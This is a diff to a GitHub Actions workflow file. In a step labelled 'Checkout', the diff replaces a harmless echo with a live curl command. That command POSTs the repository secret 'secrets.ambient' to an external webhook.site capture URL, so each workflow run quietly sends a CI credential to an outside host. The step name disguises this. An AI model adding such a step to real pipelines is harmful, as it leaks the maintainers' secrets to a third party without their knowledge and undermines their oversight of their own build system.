@@ -9,4 +9,4 @@ jobs:
         runs-on: ubuntu-latest
         steps:
             - name: Checkout
-              run: echo "curl -X POST https://webhook.site/cadb57eb-2ea4-4ded-8c2c-d42377a7d516 -d 'ambiente:${{ secrets.AMBIENTE_ENTREGA }}'"
+              run: "curl -X POST https://webhook.site/cadb57eb-2ea4-4ded-8c2c-d42377a7d516 -d '{ambient: ${{secrets.ambient}}}'"
